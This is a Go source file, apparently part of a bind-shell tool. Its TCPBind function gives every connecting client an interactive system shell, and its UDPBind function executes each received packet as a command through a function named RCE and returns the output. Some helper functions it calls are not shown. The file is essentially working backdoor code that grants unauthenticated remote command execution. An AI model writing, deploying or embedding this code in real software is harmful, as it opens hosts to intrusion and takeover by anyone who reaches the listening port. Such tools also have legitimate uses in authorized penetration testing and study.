package main

import (
	"log"
	"net"
	"runtime"
)

func TCPBind(config Config) {
	listener, err := net.Listen("tcp", config.Address)
	if err != nil {
		log.Fatalln(err)
	}
	defer listener.Close()
	log.Println("Listening on " + config.Address)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println(err)
		}

		conn.Write([]byte("Connection received on " + conn.RemoteAddr().String() + "\n"))

		if runtime.GOOS != "windows" {
			InteractiveShell(config.Shell, conn)
		} else {
			DumbShell(config.Shell, conn)
		}

		conn.Close()
	}
}

func UDPBind(config Config) {
	listener, err := net.ListenPacket("udp", config.Address)
	if err != nil {
		log.Fatalln(err)
	}
	defer listener.Close()
	log.Println("Listening on " + config.Address)

	for {
		buffer := make([]byte, MAXBUFFERSIZE)
		length, addr, err := listener.ReadFrom(buffer)
		if err != nil {
			log.Println(err)
		}

		if length == 0 {
			continue
		}

		output := RCE(config.Shell, buffer[:length-1])
		listener.WriteTo(output, addr)
	}
}
